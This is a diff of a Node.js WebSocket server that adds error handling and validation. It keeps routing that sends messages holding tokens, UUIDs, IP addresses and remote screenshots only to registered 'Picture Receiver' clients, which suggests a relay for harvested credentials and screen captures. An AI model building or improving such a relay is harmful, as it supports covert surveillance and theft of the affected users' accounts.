@@ -7,32 +7,51 @@ app.use(express.static("public"));
 
 const PORT = process.env.PORT || 3000;
 const server = http.createServer(app);
-
 const wss = new WebSocket.Server({ noServer: true });
+
+const usersInChat = new Map();
+const pictureReceivers = new Map();
+let keepAliveId;
+
 server.on('upgrade', (request, socket, head) => {
     wss.handleUpgrade(request, socket, head, ws => {
         wss.emit('connection', ws, request);
     });
 });
 
-server.listen(PORT);
-
-const usersInChat = new Map();
-const pictureReceivers = new Map(); 
-let keepAliveId;
-
 wss.on("connection", function (ws) {
-    const userID = generateUniqueID();  
-
-    ws.on("message", data => {
-        handleMessage(ws, data, userID);
+    const userID = generateUniqueID();
+    
+    ws.on("message", (data, isBinary) => {
+        try {
+            if (isBinary) {
+                handleBinaryMessage(ws, data, userID);
+            } else {
+                handleTextMessage(ws, data, userID);
+            }
+        } catch (error) {
+            console.error('Error handling message:', error);
+            sendErrorMessage(ws, 'Error processing message');
+        }
     });
 
     ws.on("close", () => {
-        handleDisconnect(userID);
-        ws.removeAllListeners(); 
+        try {
+            handleDisconnect(userID);
+        } catch (error) {
+            console.error('Error handling disconnect:', error);
+        }
     });
 
+    ws.on("error", (error) => {
+        console.error('WebSocket error:', error);
+        if (error.code === 'WS_ERR_INVALID_UTF8') {
+            sendErrorMessage(ws, 'Invalid UTF-8 sequence received');
+            // Optionally close the connection
+            // ws.close(1007, 'Invalid UTF-8 sequence');
+        }
+    });
+    
     if (wss.clients.size === 1 && !keepAliveId) {
         keepServerAlive();
     }
@@ -47,56 +66,81 @@ function generateUniqueID() {
     return Math.random().toString(36).substr(2, 9);
 }
 
-
-function handleMessage(ws, data, userID) {
+function handleTextMessage(ws, data, userID) {
+    let messageData;
     try {
-        const messageData = JSON.parse(data);
-        
-        // Check if the data matches the format shown in the image
-        if (messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
-            // If it matches, only broadcast to picture receivers
-            broadcastToPictureReceivers(messageData);
-        } else if (messageData.command === 'Picture Receiver') {
-            pictureReceivers.set(userID, ws);
-        } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
-            broadcastToPictureReceivers({
-                type: 'screenshot',
-                action: messageData.action,
-                screen: messageData.screen,
-                data: messageData.data
-            });
-        } else if (messageData.action === 'screenshot_result') {
-            broadcastToPictureReceivers({
-                type: 'screenshot',
-                action: messageData.action,
-                screen: messageData.screen,
-                data: messageData.data
-            });
-        } else {
-            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
-        }
-    } catch (e) {
-        console.error('Error data:', e);
+        messageData = JSON.parse(data);
+    } catch (error) {
+        console.error('Error parsing message data:', error);
+        sendErrorMessage(ws, 'Invalid JSON format');
+        return;
     }
+
+    if (!isValidMessageData(messageData)) {
+        console.error('Invalid message data:', messageData);
+        sendErrorMessage(ws, 'Invalid message structure');
+        return;
+    }
+    
+    if (isPictureData(messageData)) {
+        broadcastToPictureReceivers(messageData);
+    } else if (messageData.command === 'Picture Receiver') {
+        pictureReceivers.set(userID, ws);
+    } else if (isScreenshotData(messageData)) {
+        broadcastToPictureReceivers({
+            type: 'screenshot',
+            action: messageData.action,
+            screen: messageData.screen,
+            data: messageData.data
+        });
+    } else {
+        broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
+    }
+}
+
+function handleBinaryMessage(ws, data, userID) {
+    // Handle binary data here if needed
+    console.log('Received binary data from', userID);
+}
+
+function isValidMessageData(data) {
+    return typeof data === 'object' && data !== null;
+}
+
+function isPictureData(data) {
+    return data.sender && data.token && data.uuid && data.ip;
+}
+
+function isScreenshotData(data) {
+    return (data.type === 'screenshot' && typeof data.data === 'string' && data.data.startsWith('data:image/png;base64')) ||
+           (data.action === 'screenshot_result');
 }
 
 function broadcastToPictureReceivers(message) {
     const data = JSON.stringify(message);
     pictureReceivers.forEach((ws, userId) => {
-        if (ws.readyState === WebSocket.OPEN) {
-            ws.send(data, error => {
-                if (error) console.error("Error sending message to receiver:", error);
-            });
-        }
+        sendMessage(ws, data);
     });
 }
 
 function broadcastToAllExceptPictureReceivers(senderWs, message, includeSelf) {
     wss.clients.forEach(client => {
-        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
-            client.send(message);
+        if (!pictureReceivers.has(client) && (includeSelf || client !== senderWs)) {
+            sendMessage(client, message);
         }
     });
+}
+
+function sendMessage(ws, message) {
+    if (ws.readyState === WebSocket.OPEN) {
+        ws.send(message, error => {
+            if (error) console.error("Error sending message:", error);
+        });
+    }
+}
+
+function sendErrorMessage(ws, errorMessage) {
+    sendMessage(ws, JSON.stringify({ type: 'error', message: errorMessage }));
 }
 
 function handleDisconnect(userID) {
@@ -108,8 +152,22 @@ function keepServerAlive() {
     keepAliveId = setInterval(() => {
         wss.clients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
-                client.ping(); 
+                client.ping(null, false, error => {
+                    if (error) console.error("Error sending ping:", error);
+                });
             }
         });
     }, 30000);
 }
+
+server.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+});
+
+process.on('uncaughtException', (error) => {
+    console.error('Uncaught Exception:', error);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
+});
